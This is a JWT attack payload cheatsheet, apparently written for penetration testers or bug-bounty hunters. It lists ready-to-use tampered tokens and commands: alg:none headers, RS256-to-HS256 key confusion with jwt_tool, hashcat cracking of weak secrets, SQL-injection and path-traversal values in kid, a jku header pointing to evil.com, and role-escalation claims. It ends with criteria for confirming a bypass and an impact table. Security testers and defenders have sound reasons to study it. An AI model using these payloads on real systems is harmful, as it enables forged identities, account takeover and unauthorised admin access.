# JWT — Payload Cheatsheet

## Detection Methodology

### Identify JWT Usage
```
# Look for Base64url.Base64url.Base64url pattern in:
- Authorization: Bearer eyJ...
- Cookies: token=eyJ..., session=eyJ...
- URL parameters: ?token=eyJ...
- Response body: {"access_token": "eyJ..."}

# Decode header to check algorithm
echo 'eyJ...' | base64 -d
```

## Attack Payloads

### Algorithm None Attack
```json
// Original header
{"alg":"HS256","typ":"JWT"}

// Tampered header (try all variants)
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

// Encode header + tampered payload + empty signature
base64url(header).base64url(payload).
base64url(header).base64url(payload).e30=
```

### Algorithm Confusion (RS256 → HS256)
```
# If server uses RS256 (asymmetric):
# 1. Get the public key (JWKS endpoint, certificate)
# 2. Change alg to HS256
# 3. Sign with the public key as HMAC secret

# Get public key
curl https://target.com/.well-known/jwks.json

# Tools: jwt_tool, jwt-cracker
python3 jwt_tool.py JWT -X k -pk public_key.pem
```

### Weak Secret Brute Force
```bash
# hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt-cracker
jwt-cracker "eyJ..." "abcdefghijklmnopqrstuvwxyz" 6

# Common weak secrets
secret, password, 123456, changeme, test, key, jwt_secret
your-256-bit-secret (default from jwt.io)
```

### kid (Key ID) Injection
```json
// SQL injection via kid
{"alg":"HS256","kid":"' UNION SELECT 'secret' -- ","typ":"JWT"}

// Directory traversal via kid
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
// Sign with empty string as key

// kid pointing to known file
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space","typ":"JWT"}
// Sign with "2" as key (typical value of that file)
```

### JKU/X5U Header Injection
```json
// Point to attacker-controlled JWKS
{"alg":"RS256","jku":"https://evil.com/.well-known/jwks.json","typ":"JWT"}

// Host attacker JWKS with your own key pair
// Sign token with your private key
```

### Claim Manipulation
```json
// Escalate role
{"sub":"user123","role":"admin","iat":1234567890}

// Change user identity
{"sub":"admin","email":"admin@target.com","iat":1234567890}

// Extend expiration
{"sub":"user123","exp":9999999999,"iat":1234567890}

// Remove expiration
{"sub":"user123","iat":1234567890}
// (remove exp claim entirely)
```

### Token Refresh Abuse
```
# Refresh token reuse after logout
# Refresh token valid indefinitely
# Refresh token grants higher privileges than access token
# Access token not invalidated on password change
```

## Common JWKS Endpoints
```
/.well-known/jwks.json
/oauth/jwks
/api/keys
/openid-configuration → jwks_uri
/.well-known/openid-configuration → jwks_uri
```

## Validation Criteria

1. Modified token accepted by server (not just decoded client-side)
2. Privilege escalation or identity spoofing achieved
3. Works with current tokens (not expired test tokens)
4. Bypass is against server-side validation

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Identity spoofing | Access another user's account with forged JWT |
| Admin access | Forge admin-role token accepted by server |
| Persistent access | Token with no expiration accepted |
| Mass impersonation | Forge token for any user ID |
